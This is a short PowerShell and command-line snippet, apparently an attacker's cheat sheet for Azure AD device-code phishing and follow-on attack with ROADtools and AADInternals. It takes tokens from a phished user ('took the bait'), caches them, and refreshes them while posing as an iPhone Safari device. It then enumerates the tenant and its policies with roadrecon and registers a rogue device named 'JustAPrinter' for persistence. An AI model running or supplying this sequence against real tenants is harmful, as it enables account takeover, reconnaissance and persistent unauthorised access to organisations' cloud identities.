# ROADtools
pip install roadlib
pip install roadrecon
pip install roadtx

# # RoadRecon
Get-AzureToken -Client Graph

# V1: If you already have your token from a capture server defined as $Token
# Get-AzureToken -Client Graph -CaptureCode $Token 

if(!($response)){ Read-Host "User didn't bite, try again."} else {
$access = $response.access_token
$refresh = $response.refresh_token
Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh

$acc = Read-AADIntAccessToken $access
$user = $acc.upn
$domain = $user.Split("@")[1]
Write-Output "$user took the bait."

RefreshTo-MSGraphToken -refreshtoken  $response.refresh_token -domain $domain -Device iPhone -Browser Safari
 
# Road tools
roadrecon auth --access-token $response.access_token
roadrecon gather
roadrecon plugin policies 
# roadtx prt -a renew
# roadtx prtauth -c msteams -r msgraph

# Register device
roadtx device -n JustAPrinter
}